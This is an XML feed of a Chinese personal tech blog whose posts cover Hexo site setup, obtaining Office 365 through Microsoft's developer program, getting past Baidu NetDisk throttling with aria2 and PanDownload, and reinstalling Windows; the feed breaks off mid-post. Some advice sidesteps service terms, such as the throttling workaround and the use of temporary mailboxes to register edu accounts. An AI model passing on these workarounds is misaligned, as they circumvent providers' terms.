class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: &lt;repo1 address&gt;,master <span class="comment"># 请替换为你的仓库地址！</span></span><br><span class="line">  repo: &lt;repo2 address&gt;,master <span class="comment"># 请替换为你的仓库地址！</span></span><br></pre></td></tr></table></figure><p>这样编写的话一次部署，两边的仓库都会上传~</p><p>部署完成后，请到你的Github仓库的设置中，找到Github Pages，将source选到master branch来打开Pages服务！</p><h4 id="撰写文章"><a href="#撰写文章" class="headerlink" title="撰写文章"></a>撰写文章</h4><p>你可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;&lt;article name&gt;&quot;</span></span><br></pre></td></tr></table></figure><p>来创建一篇文章，它会出现在source&#x2F;_posts中，是一个.md文件，使用md编辑器打开（推荐<a href="https://www.typora.io/">Typora</a>）编辑即可，支持<a href="https://www.runoob.com/markdown/md-tutorial.html">markdown</a>和<a href="https://www.runoob.com/html/html-tutorial.html">html</a>语法</p><h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><h4 id="添加自定义域名"><a href="#添加自定义域名" class="headerlink" title="添加自定义域名"></a>添加自定义域名</h4><p>每次部署hexo都会清除你的库并且重新部署，这意味着如果你在Github的设置中添加自定义域名（会生成CNAME文件）每次都会被清除，为了避免这种麻烦，我们可以使用在source文件夹里新建CNAME文件</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/hexo-deploy-guide/CNAME-Create.png" alt="CNAME文件"></p><p>并且在CNAME文件中填写你的域名</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/hexo-deploy-guide/CNAME.png" alt="CNAME"></p><p>这样就可以避免每次部署都清除掉自定义域名，导致网站404了~</p><h4 id="自定义404页面"><a href="#自定义404页面" class="headerlink" title="自定义404页面"></a>自定义404页面</h4><p>你可以在&#x2F;themes&#x2F;.themes name&gt;&#x2F;source中放置你的404页面，当你的网站页面不存在的时候，就会显示404页面，可以引用css文件和js文件，只要跟404页面放在同一目录即可！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/hexo-deploy-guide/404.png" alt="404"></p><p>如何直接看到404呢？你可以直接在网站后面加上<a href="/404">&#x2F;404</a>就可以进入<a href="/404">404页面</a>了~</p><h4 id="添加看板娘（live2d）"><a href="#添加看板娘（live2d）" class="headerlink" title="添加看板娘（live2d）"></a>添加看板娘（live2d）</h4><p>你是否也想像我一样领养一只猫呢？或者领养一只~</p><p>回归正题，我们要怎么领养一只萌萌哒看板娘呢？当然还是要用到插件的说~</p><p>先安装插件hexo-helper-live2d</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-helper-live2d --save</span><br></pre></td></tr></table></figure><p>等待安装完后，在你的网站根目录的_config.yml中加入（可以直接复制粘贴）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#hexo-helper-live2d</span></span><br><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span><span class="comment">#是否开启显示</span></span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-tororo  <span class="comment">#模板目录，在node_modules里</span></span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150 </span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="literal">false</span>  <span class="comment">#是否在手机进行显示</span></span><br></pre></td></tr></table></figure><p>然后，找到你喜欢的模型进行安装，并把model的use属性的文本改成你安装的看板娘的文件夹名字（在node_modules里面）即可！</p><p>这样你就可以像我一样领养一只萌萌哒看板娘了~</p><h4 id="搜索引擎站点认证"><a href="#搜索引擎站点认证" class="headerlink" title="搜索引擎站点认证"></a>搜索引擎站点认证</h4><p>当你提交站点到搜索引擎的时候，免不了的就是认证你的站点。当然，认证方式有很多种，例如什么把标记放在.head&gt;.&#x2F;head&gt;之间啦，什么文件认证啊之类的，太多了</p><p>当然最方便的就是文件认证了，下载一个文件到本地，然后传到你的网站上面。</p><p>有的人就会问了，文件要放在哪里呢？</p><p>其实有两个地方都可以放，一个是根目录的source文件夹，另一个就是主题里面的source文件夹，都可以放，放在这两个文件夹的根目录即可！</p><h4 id="添加站点地图"><a href="#添加站点地图" class="headerlink" title="添加站点地图"></a>添加站点地图</h4><p>当你想让你的网站被Google或者Baidu什么的收录的时候，你就需要用到站点地图。</p><p>使用以下命令安装站点地图插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-baidu-sitemap --save <span class="comment">#安装Baidu的站点地图，为Baidu优化过的</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><p>然后打开网站根目录的_config.yml文件，加入以下条目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">- hexo-generator-baidu-sitemap</span><br><span class="line">- hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line">baidusitemap:</span><br><span class="line">    path: baidusitemap.xml</span><br><span class="line">sitemap:</span><br><span class="line">    path: sitemap.xml</span><br></pre></td></tr></table></figure><p>这样每次部署就会生成一个baidusitemap.xml和一个sitemap.xml文件，用于提交站点地图</p><p>这里以google为例子描述怎么添加站点地图</p><p>当你的网站提交到Google后，为了点击量高，我们会提交站点地图，在左边的栏目中选择站点地图，然后在上面”添加新的站点地图”中填写.Your Link&gt;&#x2F;sitemap.xml即可，Google会定期收集你的站点，并且展示在搜索结果上</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/hexo-deploy-guide/sitemap-google.png" alt="Google Webmaster"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/hexo-deploy-guide/sitemap-google-search.png" alt="Google Search Result"></p><h4 id="添加RSS订阅"><a href="#添加RSS订阅" class="headerlink" title="添加RSS订阅"></a>添加RSS订阅</h4><p>虽然我不知道这年头谁还用RSS，但是有好过没有嘛</p><p>先打开命令窗口，然后输入命令安装插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure><p>安装完成后，在网站的根目录中的_config.yml中，加入以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RSS订阅</span></span><br><span class="line">plugin:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line">feed:</span><br><span class="line"><span class="built_in">type</span>: atom</span><br><span class="line">path: atom.xml<span class="comment">#RSS文件名字，可自定义</span></span><br><span class="line"><span class="built_in">limit</span>: 20</span><br></pre></td></tr></table></figure><p>当你加入RSS订阅按钮的时候，就可以设置链接到你的&#x2F;atom.xml文件（RSS文件名字改过的当我没说），这样当别人点击你的RSS按钮时，就会弹出订阅提醒，让别人订阅你的网站。</p><h4 id="按钮调用邮件应用"><a href="#按钮调用邮件应用" class="headerlink" title="按钮调用邮件应用"></a>按钮调用邮件应用</h4><p>如果你想让别人联系你，那么最方便的方式就是通过电子邮件了。如何才能让别人点击链接或者按钮直接调用邮件应用发邮件给你呢？<a href="mailto:admin@bili33.top">实例</a></p><p>在文章中，可以使用这样的编写格式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&lt;Text&gt;</span>](<span class="link">mailto:&lt;Email Address&gt;</span>)</span><br></pre></td></tr></table></figure><p>这样当别人点击.Text&gt;的时候，就会调用电子邮件应用，同样如果是按钮的话，只需要将按钮的链接设为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mailto:<span class="tag">&lt;<span class="name">Email</span> <span class="attr">Address</span>&gt;</span></span><br></pre></td></tr></table></figure><p>即可调用电子邮件程序！</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>Hexo的教程我就写了这么多，可能有些没写到的或者我没想到的，有可能在将来会偶尔更新一下这篇文章，当然，如果你有什么问题，欢迎发邮件到<a href="mailto:admin@bili33.top">admin@bili33.top</a>来与我探讨，我非常欢迎！如果你想与我交换友链，请到<a href="/link">友情链接网页</a>的评论区留言，我有时间会看评论的.商业网站勿扰哦~</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白嫖Office365？这种好事我当然要来！</title>
      <link href="/posts/Office365/"/>
      <url>/posts/Office365/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><strong><font color=#ff0000>本方法存在局限性，尝试之前请确保你有让微软讲你的账户认定为开发者的能力（如频繁调用api等），如果你只是搀着onedrive的5T空间，那么我推荐你直接拉到题外话中的网址领取</font></strong></p></blockquote><p>相信很多人都在用Office，用的要么是WPS Office，要么就是Microsoft Office。正版的Office365价格贵得要死↓</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-tags.png" alt="家用Office价格（非商业用途）"></p><p>所以今天，我就来教教怎么获取<strong>免费</strong>的Office365（而且还是管理员哦~）</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>你需要准备：一个微软账户（个人用户，即非企业用户）</p><h2 id="获取Office365账号"><a href="#获取Office365账号" class="headerlink" title="获取Office365账号"></a>获取Office365账号</h2><p>网址我贴在这里啦：<a href="https://developer.microsoft.com/">https://developer.microsoft.com</a></p><p>进入以后发现里面有四个按钮</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/Get-Started.png" alt="微软开发者中心"></p><p>稍微解释一下，第一个和最后一个想必不用说了吧，都是熟悉的东西；第二个是微软的云服务平台<a href="https://azure.microsoft.com/en-us/">Azure</a>，第三个是微软的开发者软件<a href="https://visualstudio.microsoft.com/">Visual Studio</a>（我还是喜欢VSCode），在这里我们点击Office，其他有需要的自己斟酌哈~</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-start.png" alt="Office开发者页面"></p><p>会看英文的小伙伴们就知道点哪个，不会看的我告诉你是先点右上角sign in</p><p>登录自己的账号后，点上面的Developer Program，进入开发者计划页面，点击中间那个最大的按钮写着JOIN NOW的~</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-join.png" alt="Office开发者页面 - 加入开发者计划"></p><p>点进去后会看见一个全英的界面，在第一个选择框里选择”China”（当然你要选其他国家我也没意见），第二个的Company填写你自己想要的名字，因为微软给的管理员账号是&lt;username&gt;@&lt;domain&gt;.onmicrosoft.com（自定义域名除外），所以你设定的名字需要尽量跟后面设置的一致。</p><p>设定好后，把下面两个勾给勾上，点击NEXT</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-signup.png" alt="配置界面"></p><p>然后微软就会问你一堆问题</p><p>像下面这样：</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-Q1.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-Q2.png"></p><p>看得懂英语的自己选择，但是在<strong>Products</strong>里面最好全部勾上，这样你就能使用所有的功能。如果看不懂英语，那么第一个问题和第二个问题请选择<strong>Personal Projects</strong>（第四个选项），第三个<strong>Products</strong>和第四个<strong>Technologies</strong>全部勾上，最后一个问题随便选择一个即可（如果你不是真的要开发的话），全部选择完以后点击下方的JOIN即可！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-Answer.png"></p><p>然后你就会像我一样被导到这个界面，说明你已经成功注册了！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-subscription.png"></p><p>点击下方的<strong>SET UP SUBSCRIPTION</strong>会弹出来一个小窗，第一个不用说，之前选什么现在就选什么，第二个create username是设置邮箱前缀，create domain就是上面提到的在邮箱后缀的第一位的东西，自己喜欢，但是尽量跟前面一致！下面两个框都是让你输入密码，输入完以后点下面的Continue即可！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-console-signup.png" alt="启用office订阅"></p><p>然后就会弹出提示，要你输入手机号码</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Office365/office-console-phone.png" alt="输入手机号码"></p><p>输入完了点击下面的send code，就会有短信发到你的手机，后面我不用说都可以解决了吧~</p><div class="note primary flat"><h3 id="2020-x2F-4-x2F-27更新"><a href="#2020-x2F-4-x2F-27更新" class="headerlink" title="2020&#x2F;4&#x2F;27更新"></a>2020&#x2F;4&#x2F;27更新</h3></div><p>保命需要，<a href="/2020/04/27/Office365-Renew-Project/">教程在这</a></p><h3 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h3><p>这个Office365需要用户足够活跃，每次的订阅周期为92天，过了92天就会检测用户是否足够活跃，如果不活跃则会被删除所有数据（当然你再注册也是可以的），所以比较推荐多人用一个组织。</p><blockquote><p><del>1、你的姓名（可以是假名，我不在意）</del><br><del>2、显示名称（类似你在登录win10前的用户名）</del><br><del>3、邮箱前缀（就是@前面的那一串）</del><br><del>4、接收账号密码邮件的邮箱（如果没收到请检查垃圾箱！）</del><br><del>当我为你创建账户后，我会通过邮件通知你，也会把账号密码发到你的邮箱！</del><br><del>说明：我使用的也是这种office（92天订阅期），所以为了避免office删除组织后文件丢失，请不要把贵重文件放在onedrive中，丢失概不负责！</del><br>（表示微软并没有给我续费。。。）</p></blockquote><p>如果不能确保自己能够被微软认定为开发者，那么我推荐你到<a href="http://233455.xyz:3000/">http://233455.xyz:3000/</a>（好像已经失效了？）去领取一个临时邮箱注册edu版（注：此edu注册的账户仅提供5T的onedrive空间，若需要office授权，请在该网页下面的使用规则查看）<br>祝大家白嫖成功~~~</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被限速的日子，该过去了！</title>
      <link href="/posts/BaiduNetDisk-Limit-Break/"/>
      <url>/posts/BaiduNetDisk-Limit-Break/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note danger flat"><h3 id="本教程可能已经过时"><a href="#本教程可能已经过时" class="headerlink" title="本教程可能已经过时"></a>本教程可能已经过时</h3><p>鉴于Pandownload网页端经常服务器维护，本页面教程可能已经过时！</p></div><h3 id="辣鸡百度云，又限我速！"><a href="#辣鸡百度云，又限我速！" class="headerlink" title="辣鸡百度云，又限我速！"></a>辣鸡百度云，又限我速！</h3><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Aria2c-Break-BaiduNetDisk/limited-speeds.png" alt="百度云限速（真实）"></p><p>百度云天天限速，8M&#x2F;s的网速硬生生被拖到8kb&#x2F;s，太真实了，这限速估计也烦了不少人，但是用speedpan之类的软件可能就有封号风险，所谓的封号不是封禁账号，是直接断你的线程断剩下一个，这样就可以拖慢你的网速。</p><p>那么我们要怎么样不被封号的同时又能告诉下载呢？（鉴于好多小伙伴看不懂我的在线版本教程，所以我在2019&#x2F;8&#x2F;13修改了教程，只剩下普通版）</p><h3 id="第一步、部署本地aria2"><a href="#第一步、部署本地aria2" class="headerlink" title="第一步、部署本地aria2"></a>第一步、部署本地aria2</h3><p>下载<a href="https://github.com/GamerNoTitle/Aria2c-Break-BaiduNetDisk/raw/master/Aria2c%20All%20In%20One.zip">Aria2c All In One工具包</a>，然后打开里面的start.bat文件，会弹出一个cmd窗口，防火墙提示请允许！你也可以打开start-vanish.vbs文件，这样就不会弹出cmd窗口，若要关闭Aria2c，直接双击stop.bat即可！</p><h4 id="1、开启aria2"><a href="#1、开启aria2" class="headerlink" title="1、开启aria2"></a>1、开启aria2</h4><p>直接点开文件里面的start.bat文件就可以打开aria2，但是这样做就会生成一个窗口，有些人就认为它不美观，不想要它，那就可以打开文件里面的start-vanish.vbs，就可以做到既没有窗口又可以打开aria2</p><h4 id="2、配置aria2"><a href="#2、配置aria2" class="headerlink" title="2、配置aria2"></a>2、配置aria2</h4><h5 id="①、第二十七行"><a href="#①、第二十七行" class="headerlink" title="①、第二十七行"></a>①、第二十七行</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 单个任务最大线程数<span class="punctuation">,</span> 添加时可指定<span class="punctuation">,</span> 默认<span class="punctuation">:</span><span class="number">5</span></span><br><span class="line">split=<span class="number">5</span></span><br></pre></td></tr></table></figure><p>split后面的数字随便改，只要你认为你的电脑能吃那么多的线程。</p><h5 id="②、第六十一行"><a href="#②、第六十一行" class="headerlink" title="②、第六十一行"></a>②、第六十一行</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 设置的RPC授权令牌<span class="punctuation">,</span> v1<span class="number">.18</span><span class="number">.4</span>新增功能<span class="punctuation">,</span> 取代 --rpc-user 和 --rpc-passwd 选项</span><br><span class="line">#rpc-secret=secret</span><br></pre></td></tr></table></figure><p>这是你的aria2密钥，不过如果你是本地用或者局域网内用就不建议设置密钥，rpc-secret前面的#去掉，然后把后面的secret改成你自己的密钥即可！</p><h3 id="第二步（可选）：部署ariaNg"><a href="#第二步（可选）：部署ariaNg" class="headerlink" title="第二步（可选）：部署ariaNg"></a>第二步（可选）：部署ariaNg</h3><p><a href="https://github.com/GamerNoTitle/Aria2c-Break-BaiduNetDisk/raw/master/AriaNg.zip">下载AriaNg文件</a>，并解压到自定义目录</p><p>打开里面的index.html文件，进入AriaNg设置</p><p>填写以下内容：</p><p>Aria2c RPC 别名：【自己填写】</p><p>Aria2c RPC 地址：127.0.0.1或localhost 6800 jsonrpc</p><p>Aria2c RPC 协议：HTTP</p><p>Aria2c RPC HTTP 请求方法：POST</p><p>Aria2c RPC 密钥：（填写自己的密钥，默认为空）</p><h3 id="第三步、打开你的分享链接，在分享链接后面加上wp进入PanDownload"><a href="#第三步、打开你的分享链接，在分享链接后面加上wp进入PanDownload" class="headerlink" title="第三步、打开你的分享链接，在分享链接后面加上wp进入PanDownload"></a>第三步、打开你的分享链接，在分享链接后面加上wp进入PanDownload</h3><p>[无图警告]</p><h3 id="第四步、点击想下载的文件，选择Aria2下载，输入内容如下："><a href="#第四步、点击想下载的文件，选择Aria2下载，输入内容如下：" class="headerlink" title="第四步、点击想下载的文件，选择Aria2下载，输入内容如下："></a>第四步、点击想下载的文件，选择Aria2下载，输入内容如下：</h3><h4 id="主机：127-0-0-1-或-localhost"><a href="#主机：127-0-0-1-或-localhost" class="headerlink" title="主机：127.0.0.1 或 localhost"></a>主机：127.0.0.1 或 localhost</h4><h4 id="端口：6800-（如果自己改了端口就请填写自己的）"><a href="#端口：6800-（如果自己改了端口就请填写自己的）" class="headerlink" title="端口：6800 （如果自己改了端口就请填写自己的）"></a>端口：6800 （如果自己改了端口就请填写自己的）</h4><h4 id="密钥：（默认留空，如果设置了密钥就填写密钥）"><a href="#密钥：（默认留空，如果设置了密钥就填写密钥）" class="headerlink" title="密钥：（默认留空，如果设置了密钥就填写密钥）"></a>密钥：（默认留空，如果设置了密钥就填写密钥）</h4><h4 id="下载路径：（填自己电脑的文件夹路径，例如C-Users-GamerNoTitle-Download，就是我的文档里面的下载文件夹）"><a href="#下载路径：（填自己电脑的文件夹路径，例如C-Users-GamerNoTitle-Download，就是我的文档里面的下载文件夹）" class="headerlink" title="下载路径：（填自己电脑的文件夹路径，例如C:\Users\GamerNoTitle\Download，就是我的文档里面的下载文件夹）"></a>下载路径：（填自己电脑的文件夹路径，例如C:\Users\GamerNoTitle\Download，就是我的文档里面的下载文件夹）</h4><h5 id="（以下是一个例子，请不要按照我这么填！！！）"><a href="#（以下是一个例子，请不要按照我这么填！！！）" class="headerlink" title="（以下是一个例子，请不要按照我这么填！！！）"></a>（以下是一个例子，请不要按照我这么填！！！）</h5><p><img src="https://github.com/GamerNoTitle/Aria2c-Break-BaiduNetDisk/blob/master/img/pandownload.png?raw=true" alt="pandownload aria配置图"></p><p>填好以后点确定会直接开始下载</p><p>这种方式是可以飞速下载的，当然这样下载的结果就是文件存放在了自己设定的目录。</p><p>忘了说了，pandownload是有每日获取次数限制的，限制是限制公网ip，也就是同网络下一个人被限制了，其他人也会被限制，不知道具体是多少次。。。</p><p>祝各位突破限速成功！</p><p>封面下载（来自Watch_Dogs 2）：<a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Aria2c-Break-BaiduNetDisk/Cover.jpg">点我下载！（4K图）</a></p><p>狗二图包详见育碧！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Aria2c-Break-BaiduNetDisk/Cover.jpg" alt="DedSec"></p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别再问我怎么装系统了，再问我就把这边文章丢到你脸上！</title>
      <link href="/posts/Windows-Setup/"/>
      <url>/posts/Windows-Setup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/cover1.jpg"></p><p><a href="https://www.pixiv.net/member_illust.php?mode=medium&illust_id=72039875">封面来源地址</a></p><h3 id="为什么会写这篇文章？"><a href="#为什么会写这篇文章？" class="headerlink" title="为什么会写这篇文章？"></a>为什么会写这篇文章？</h3><p>昨天晚上我拉我们班某位钻石大佬打LOL，带我上分，结果他告诉我他电脑炸了，要重装系统，问我怎么重装系统。。。</p><p>我是这么回答他的（源自微信聊天记录）：</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/WeChat-Chatting.png"></p><p>我（内心）：有句MMP不知当说不当说。。。</p><p><strong>今天我就要来详细讲一讲怎么新装&#x2F;重装系统（win7~Win10通用，不包含Linux）</strong></p><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>我会介绍两个方法，第一个我把它叫做<code>萌新友好法</code>，第二个我把它叫做<code>萌新不友好法</code></p><p>这里用到的工具稍微列举一下：</p><h4 id="1-萌新友好法：Windows官方镜像、一个8G-的U盘、U深度或者其他乱七八糟的PE工具箱（这里没有给U深度打广告的意思，只是我一般介绍别人方法的时候会告诉他用U深度）"><a href="#1-萌新友好法：Windows官方镜像、一个8G-的U盘、U深度或者其他乱七八糟的PE工具箱（这里没有给U深度打广告的意思，只是我一般介绍别人方法的时候会告诉他用U深度）" class="headerlink" title="1.萌新友好法：Windows官方镜像、一个8G+的U盘、U深度或者其他乱七八糟的PE工具箱（这里没有给U深度打广告的意思，只是我一般介绍别人方法的时候会告诉他用U深度）"></a>1.萌新友好法：Windows官方镜像、一个8G+的U盘、U深度或者其他乱七八糟的PE工具箱<code>（这里没有给U深度打广告的意思，只是我一般介绍别人方法的时候会告诉他用U深度）</code></h4><h4 id="2-萌新不友好法：Windows官方镜像、软碟通（Ultraiso，无需注册）、一个8G-的U盘"><a href="#2-萌新不友好法：Windows官方镜像、软碟通（Ultraiso，无需注册）、一个8G-的U盘" class="headerlink" title="2.萌新不友好法：Windows官方镜像、软碟通（Ultraiso，无需注册）、一个8G+的U盘"></a>2.萌新不友好法：Windows官方镜像、软碟通（Ultraiso，无需注册）、一个8G+的U盘</h4><h3 id="开始装机！"><a href="#开始装机！" class="headerlink" title="开始装机！"></a>开始装机！</h3><h4 id="1-1-x2F-2-1、镜像下载"><a href="#1-1-x2F-2-1、镜像下载" class="headerlink" title="1.1&#x2F;2.1、镜像下载"></a>1.1&#x2F;2.1、镜像下载</h4><p>你需要去微软官网或者是某些网站上面下载Windows的官方镜像，这里推荐<a href="https://www.microsoft.com/zh-cn/software-download/windows10">Windows官方下载工具</a>或者推荐网站<a href="https://msdn.itellyou.cn/">MSDN, 我告诉你</a>下载镜像。</p><p>需要注意的是，如果使用Windows官方下载工具，建议直接使用里面的“为另一台电脑创建介质“功能，并且直接插入U盘写入，当然你愿意选择创建ISO也可以，ISO的用法会在下面提到。</p><p>如果使用MSDN下载，那么建议使用支持ed2k协议的下载工具（例如迅雷，但不推荐）来下载，在这里介绍我平常使用的方式：将ed2k链接丢进百度网盘的离线下载，然后创建分享，在分享链接的pan.baidu.com的baidu后面加wp变成pan.baiduwp.com，进入PanDownload可以下载得快一些（文件需小于4G，否则还是得使用百度网盘）</p><h4 id="1-2、写入U深度"><a href="#1-2、写入U深度" class="headerlink" title="1.2、写入U深度"></a>1.2、写入U深度</h4><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/U-Deep.jpg"></p><p>插入U盘，勾上支持UEFI启动（现在的电脑应该都支持），点击开始制作。（当然你可以选择高级设置设定自己的UI）</p><p>制作完后可以试试模拟启动，看看是否制作成功了</p><h4 id="1-3、解压Windows镜像"><a href="#1-3、解压Windows镜像" class="headerlink" title="1.3、解压Windows镜像"></a>1.3、解压Windows镜像</h4><p>将Windows镜像解压，丢在U盘的根目录或建立文件夹丢在文件夹内（不要直接把镜像丢在ISO文件夹里面，等会会告诉你为什么）</p><h4 id="1-4、从U盘启动"><a href="#1-4、从U盘启动" class="headerlink" title="1.4、从U盘启动"></a>1.4、从U盘启动</h4><p>重启你的电脑，打开启动菜单（按什么键请问百度），选择你的U盘，如果发现有两个同样名字的U盘，优先选择前面有<code>UEFI</code>字样的，如果UEFI无法启动再选择没有UEFI的。进入PE，可以在导航栏右边的彩屏图标右键调整分辨率（不是必要的），关闭弹出来的装机工具（不推荐使用它，因为使用它装系统后第一次开机会有很多奇奇怪怪的软件。这也是不推荐把ISO直接丢在U盘的ISO文件夹里的原因）</p><h4 id="1-5、用WindowsNTSetup安装系统"><a href="#1-5、用WindowsNTSetup安装系统" class="headerlink" title="1.5、用WindowsNTSetup安装系统"></a>1.5、用WindowsNTSetup安装系统</h4><p>在桌面上找到WindowsNTSetup，或者在所有应用里面找到它，打开它。</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/WindowsNTSetup.png"></p><p>Windows安装源请选择.\sources\install.wim或者.\sources\install.esd，引导驱动器选择你想要安装Windows的盘符（对单系统而言），安装驱动器选择你要安装Windows的盘符。</p><p>下面的版本选项选择你需要的版本，优化调整根据自己的需要调整。下面是我一般会选择的东西</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/config.png"></p><p>调整完以后点开始安装即可！</p><h4 id="1-6、安装完成"><a href="#1-6、安装完成" class="headerlink" title="1.6、安装完成"></a>1.6、安装完成</h4><p>安装完成后，电脑将自动重启，请移除你的U盘，等待系统启动，并且根据提示设置你的电脑！</p><h4 id="2-2、使用软碟通写入镜像"><a href="#2-2、使用软碟通写入镜像" class="headerlink" title="2.2、使用软碟通写入镜像"></a>2.2、使用软碟通写入镜像</h4><p>打开软碟通（以管理员身份运行），将你的Windows镜像拖入右边上面的框里面并双击打开（如果弹出提示请点“是”）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/Ultraiso1.png"></p><p>在上面的导航栏中选择启动–&gt;写入硬盘映像，如果弹出UAC提示请点击是，就会出现写入页面（如下图）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/Ultraiso2.png"></p><p>点击写入，注意：<code>此操作会清除你U盘的所有数据，包括所有分区！！！</code>一旦你明白注意事项，点“是”就可以写入了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/Ultraiso3.png"></p><p>等待写入完成，重启电脑进入BOOT Menu，从U盘启动（UEFI优先）</p><h4 id="2-3、安装Windows"><a href="#2-3、安装Windows" class="headerlink" title="2.3、安装Windows"></a>2.3、安装Windows</h4><p>根据提示安装，如果提示说无法安装，请点击下面的详细信息，根据内容百度解决，这里我提供最常见的一种情况</p><p>提示：Windows 无法安装到这个磁盘。选中的磁盘具有MBR分区表。在 EFI 系统上，Windows 只能安装到 GPT 